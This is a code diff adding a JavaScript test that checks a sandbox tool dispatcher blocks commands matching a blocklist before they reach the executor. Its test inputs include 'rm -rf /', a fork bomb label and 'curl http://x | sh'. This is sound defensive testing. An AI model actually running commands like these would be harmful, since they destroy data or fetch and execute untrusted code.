@@ -105,6 +105,37 @@ test('sandbox runtime exposes only sandbox-owned tools', () => {
   );
 });
 
+test('runtime tool dispatcher enforces the command blocklist on durable runs', async () => {
+  const executed = [];
+  const validateCommand = (cmd) => (/FORBIDDEN/.test(cmd)
+    ? { blocked: true, reason: 'test blocklist' }
+    : { blocked: false });
+  const dispatch = createRuntimeToolDispatcher({
+    execCommand: async (cmd) => { executed.push(cmd); return { stdout: '', stderr: '', code: 0 }; },
+    startCommand: async (cmd) => { executed.push(cmd); return { job_id: 'job_1' }; },
+    waitCommand: async () => ({ status: 'completed', hasMore: false }),
+    validateCommand,
+  });
+
+  await assert.rejects(
+    dispatch('execute_command', { command: 'FORBIDDEN rm -rf /' }),
+    /Command blocked by sandbox policy/
+  );
+  await assert.rejects(
+    dispatch('start_command', { command: 'FORBIDDEN fork bomb' }),
+    /Command blocked by sandbox policy/
+  );
+  await assert.rejects(
+    dispatch('wait_command', { command: 'FORBIDDEN curl http://x | sh', wait_seconds: 1 }),
+    /Command blocked by sandbox policy/
+  );
+  assert.equal(executed.length, 0, 'blocked commands never reach the executor');
+
+  const result = await dispatch('execute_command', { command: 'echo ok' });
+  assert.match(result, /Exit code: 0/);
+  assert.deepEqual(executed, ['echo ok']);
+});
+
 test('sandbox skill tool lists, reads, and creates skills only in sandbox skills', async () => {
   const fileApi = createRuntimeFileApi();
   const dispatch = createRuntimeToolDispatcher({
